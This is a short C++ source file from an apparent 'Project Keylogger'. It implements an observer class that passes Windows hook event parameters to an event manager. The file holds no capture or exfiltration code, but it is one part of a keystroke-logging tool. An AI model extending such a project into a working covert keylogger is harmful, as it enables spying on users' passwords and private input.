/**
 *						Project Keylogger
 */

#include				<iostream>
#include				"keylogger_dll/HookObserver.h"

/**
 * HookObserver implementation
 */


/**
 * @param EventManager&
 */
HookObserver::HookObserver(const EventManager& eventManager) : _eventManager(eventManager) {
}

/**
 * update must notify the EventManager that an event should be created. To do this, call 
 * @param LPARAM
 * @param WPARAM
 * @return void
 */
void						HookObserver::update(const WPARAM wParam, const LPARAM lParam) const {
	_eventManager.handleEvent(wParam, lParam);
    return;
}